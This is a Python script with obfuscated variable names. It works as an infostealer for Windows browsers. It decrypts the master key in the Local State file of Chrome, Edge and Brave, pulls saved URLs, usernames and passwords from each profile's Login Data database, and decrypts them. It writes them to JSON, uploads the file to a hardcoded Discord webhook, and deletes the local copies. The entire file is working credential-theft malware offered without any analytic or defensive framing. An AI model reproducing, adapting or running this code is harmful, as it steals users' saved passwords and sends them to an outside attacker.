import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
from Cryptodome.Protocol.KDF import PBKDF2
import shutil
import requests
import hashlib
import re

c2xG6J1 = "https://discord.com/api/webhooks/1297215069536649308/TDyPyTKAVLgR5bzMAdfDD5ca8UlkWYGz1IVcOvUyl_sE5Vah7rgkijWhrGl1DhPO4sfp"

r3wD9E8 = {
    "chrome": {
        "g8fL4N6": os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % os.environ['USERPROFILE']),
        "q2sZ5M3": os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % os.environ['USERPROFILE'])
    },
    "edge": {
        "g8fL4N6": os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data\Local State" % os.environ['USERPROFILE']),
        "q2sZ5M3": os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data" % os.environ['USERPROFILE'])
    },
    "brave": {
        "g8fL4N6": os.path.normpath(r"%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State" % os.environ['USERPROFILE']),
        "q2sZ5M3": os.path.normpath(r"%s\AppData\Local\BraveSoftware\Brave-Browser\User Data" % os.environ['USERPROFILE'])
    }
}

def y6cR9X1(a4nF5B2):
    try:
        with open(a4nF5B2, 'rb') as d8rQ3L7:
            t3wV4X9 = requests.post(c2xG6J1, files={'file': d8rQ3L7})
        if t3wV4X9.status_code != 204:
            return
    except Exception as m1dY7C5:
        return

def l2kF9V3(s1pN7W4):
    try:
        with open(s1pN7W4, "r", encoding='utf-8') as q4zB3H8:
            o6gD1C9 = q4zB3H8.read()
            o6gD1C9 = json.loads(o6gD1C9)
        f7jX4M5 = base64.b64decode(o6gD1C9["os_crypt"]["encrypted_key"])
        f7jX4M5 = f7jX4M5[5:]
        f7jX4M5 = win32crypt.CryptUnprotectData(f7jX4M5, None, None, None, 0)[1]
        return f7jX4M5
    except Exception as c3sQ8T6:
        return None

def i5dS7V6(v5wK2E1, g9uY8J2):
    return v5wK2E1.decrypt(g9uY8J2)

def q7bW2P6(e2pH8M5, j9kF6R1):
    return AES.new(e2pH8M5, AES.MODE_GCM, j9kF6R1)

def d4yU1Q8(k9tR3N2, v5lS6C9):
    try:
        b3qD2M7 = k9tR3N2[3:15]
        z7fE4N6 = k9tR3N2[15:-16]
        g9rB5X4 = q7bW2P6(v5lS6C9, b3qD2M7)
        u4rL6V2 = i5dS7V6(g9rB5X4, z7fE4N6)
        u4rL6V2 = u4rL6V2.decode()
        return u4rL6V2
    except Exception as o8yX1F3:
        return ""

def p7xL3K5(c5qN4W9):
    try:
        shutil.copy2(c5qN4W9, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as f9rZ2C1:
        return None

def e3oF7J4(b4gT2D6, y8vX4L3, v2qB9R1):
    try:
        s9cK1T5 = []
        l4hN2Z6 = l2kF9V3(y8vX4L3["g8fL4N6"])
        k9vH5S1 = [g9dV6T8 for g9dV6T8 in os.listdir(y8vX4L3["q2sZ5M3"]) if re.search("^Profile*|^Default$", g9dV6T8) != None]
        
        for o5mG9L1 in k9vH5S1:
            n7pR6X5 = os.path.normpath(r"%s\%s\Login Data" % (y8vX4L3["q2sZ5M3"], o5mG9L1))
            a2kF9E4 = p7xL3K5(n7pR6X5)
            if l4hN2Z6 and a2kF9E4:
                u6vY8C4 = a2kF9E4.cursor()
                u6vY8C4.execute("SELECT action_url, username_value, password_value FROM logins")
                
                for z8yQ4F2 in u6vY8C4.fetchall():
                    m6qL2D9 = z8yQ4F2[0]
                    n4bX5C3 = z8yQ4F2[1]
                    j3rW6V1 = z8yQ4F2[2]
                    
                    if m6qL2D9 != "" and n4bX5C3 != "" and j3rW6V1 != "":
                        l9wK3Q5 = d4yU1Q8(j3rW6V1, l4hN2Z6)
                        s9cK1T5.append({
                            "url": m6qL2D9,
                            "username": n4bX5C3,
                            "password": l9wK3Q5
                        })
                
                u6vY8C4.close()
                a2kF9E4.close()
                os.remove("Loginvault.db")

        with open(v2qB9R1, 'w', encoding='utf-8') as v6cK3N8:
            json.dump(s9cK1T5, v6cK3N8, indent=4)

        y6cR9X1(v2qB9R1)
        os.remove(v2qB9R1)

    except Exception as f2gH4W8:
        return

if __name__ == '__main__':
    try:
        for u7pX4N3, k3gV5C2 in r3wD9E8.items():
            e3oF7J4(u7pX4N3, k3gV5C2, f"{u7pX4N3}.json")
    except Exception as r4fZ8M9:
        pass
